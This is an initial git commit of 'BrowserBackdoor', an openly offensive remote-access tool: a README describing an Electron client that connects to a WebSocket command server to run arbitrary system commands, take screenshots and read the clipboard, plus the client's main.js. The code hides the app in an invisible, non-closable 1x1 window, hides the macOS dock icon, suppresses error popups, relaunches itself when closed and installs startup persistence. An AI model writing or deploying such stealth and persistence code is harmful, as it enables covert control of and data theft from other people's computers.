8069e57add91648269451d62c7414f55c6e8d956
IMcPwn <imcpwn@protonmail.com>
2016-05-29 11:32:31 -0400

    Initial commit

---
+++ README.md
@@ -0,0 +1,87 @@
+BrowserBackdoor [![Build Status](https://travis-ci.org/IMcPwn/browser-backdoor.svg?branch=master)](https://travis-ci.org/IMcPwn/browser-backdoor)
+===================
+BrowserBackdoor is an electron application that uses a simple JavaScript backdoor to connect to the listener.
+
+
+BrowserBackdoorServer is a WebSocket server that listens for connections from BrowserBackdoor
+and creates an command line interface for executing commands on the remote system(s).
+
+The JavaScript backdoor in BrowserBackdoor can be used on all browsers that support WebSockets.
+It will not have access to the Electron API of the host computer unless the BrowserBackdoor Client application is used.
+
+Some things you can do if you have access to the Electron API:
+
+1. Open new browser windows that point to any website. 
+https://github.com/electron/electron/blob/master/docs/api/browser-window.md#new-browserwindowoptions
+
+2. Change and view the clipboard.
+https://github.com/electron/electron/blob/master/docs/api/clipboard.md#clipboard
+
+3. Access cross-platform Operating System notifications and the tray on OS X and Windows.
+https://github.com/electron/electron/blob/master/docs/api/tray.md#tray
+
+4. Take screenshots.
+https://github.com/electron/electron-api-demos
+
+5. Execute arbitrary system commands.
+http://stackoverflow.com/a/28394895
+
+6. Run at startup.
+https://www.npmjs.com/package/auto-launch
+
+Installing
+===================
+
+NodeJS and NPM are required for the client.
+
+Ruby 2.1+ is required for the server.
+
+First, clone the repository. All the rest of the commands shown assume you are in the root of the repository.
+
+```sh
+git clone https://github.com/IMcPwn/browser-backdoor
+cd browser-backdoor
+```
+
+How to install and run the BrowserBackdoor electron application.
+
+```sh
+cd client
+npm install
+# Configure index.html before the next command
+npm start
+```
+
+Building executables for all platforms. (see https://github.com/electron-userland/electron-packager for more information)
+```sh
+cd client
+npm install electron-packager -g
+electron-packager . --all
+```
+
+How to install and run the BrowserBackdoorServer.
+```sh
+cd server
+gem install bundler
+bundle install
+# Configure config.yml before the next command
+ruby bb-server.rb
+```
+
+Usage
+===================
+The client application will run in the background and provide no user interface while running. 
+To check that it's running, quit it, or enable/disable system startup press Command (OS X) OR Control (Windows/Linux) + Alt + \ or whatever you configured the shortcut as in main.js.
+
+The server application's usage can be accessed by typing help in the command line.
+
+License
+===================
+MIT
+
+
+Contact
+===================
+This program is made by Carleton Stuberg.
+
+Contact information such as email, twitter, and other methods of contact are avaliable here: http://imcpwn.com
---
+++ client/main.js
@@ -0,0 +1,159 @@
+/*
+ * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
+ * BrowserBackdoor is an electron application that uses a JavaScript backdoor (in index.html)
+ * to connect to the listener (BrowserBackdoorServer).
+ * For more information visit: http://imcpwn.com
+   
+ * MIT License
+
+ * Copyright (c) 2016 Carleton Stuberg
+
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ * SOFTWARE.
+ */
+
+const electron = require('electron')
+const AutoLaunch = require('auto-launch');
+const app = electron.app;
+const dialog = electron.dialog;
+const globalShortcut = electron.globalShortcut;
+const BrowserWindow = electron.BrowserWindow;
+const Menu = electron.Menu;
+
+// Keep a global reference of the window object so it doesn't get garbage collected.
+let mainWindow;
+
+// Passing true enables startup, false disables startup.
+function manageStartup(enable) {
+    let appLauncher = new AutoLaunch({
+        // Change this to the name of the application or what
+        // should appear in the startup menu.
+        name: 'BB'
+    });
+    if (enable) {
+        appLauncher.isEnabled().then(function(enabled){
+            if(enabled) return;
+            return appLauncher.enable();
+        }).then(function(err){
+            // TODO: Deal with error
+        });
+    } else {
+        appLauncher.isEnabled().then(function(enabled){
+            if(!enabled) return;
+            return appLauncher.disable();
+        }).then(function(err){
+            // TODO: Deal with error
+        }); 
+    }
+}
+
+function createWindow() {
+    // Change CommandOrControl+Alt+\ to the shortcut to manage the application.
+    globalShortcut.register('CommandOrControl+Alt+\\', function () {
+        let result = dialog.showMessageBox({
+            type: 'info',
+            title: 'Shortcut pressed',
+            message: 'You pressed the keyboard shortcut. \nIf you do not know what you are doing press cancel.',
+            buttons: ['Quit Application', 'Enable Startup', 'Disable Startup', 'Cancel']
+        });
+        
+        if (result === 0) {
+            mainWindow = null;
+            app.exit(0);
+        } else if (result === 1) {
+            manageStartup(true);
+        } else if (result === 2) {
+            manageStartup(false);
+        }
+    });
+    
+    // Create a hidden browser window which loads the backdoor.
+    mainWindow = new BrowserWindow({
+        width: 1,
+        height: 1,
+        show: false,
+        closable: false,
+        transparent: true,
+        resizable: false,
+        skipTaskbar: true
+    });
+
+    mainWindow.loadURL(`file://${__dirname}/index.html`);
+
+    // Hide application menu.
+    Menu.setApplicationMenu(null);
+
+    mainWindow.on('closed', function() {
+        mainWindow = null;
+    });
+}
+
+// Only allow one instance of the application at a time.
+const shouldQuit = app.makeSingleInstance((commandLine, workingDirectory) => {
+    if (mainWindow === null) {
+        createWindow();
+    }
+});
+
+if (shouldQuit) {
+    mainWindow = null;
+    app.exit(0);
+}
+
+// Hide application from tray if on OS X.
+if (process.platform === 'darwin') {
+    app.dock.hide();
+}
+
+// Catch uncaughtExceptions so no popups appear on errors.
+process.on('uncaughtException', function ( err ) {
+    // TODO: Restart application or print error message
+    console.error('An uncaughtException was found, the program will end.');
+    process.exit(1);
+});
+
+// Accept --startup as command line argument to enable on startup.
+process.argv.forEach(function (val, index, array) {
+  if (val === "--startup") {
+    manageStartup(true);
+  }
+});
+
+app.on('before-quit', function() {
+    mainWindow = null;
+});
+
+app.on('will-quit', function() {
+    globalShortcut.unregisterAll()
+});
+
+// This method will be called when Electron has finished
+// initialization and is ready to create browser windows.
+app.on('ready', createWindow)
+
+// Re-open if all windows are closed.
+app.on('window-all-closed', function() {
+    createWindow();
+});
+
+app.on('activate', function() {
+    // Create window if activated and it doesn't already exist.
+    if (mainWindow === null) {
+        createWindow();
+    }
+});
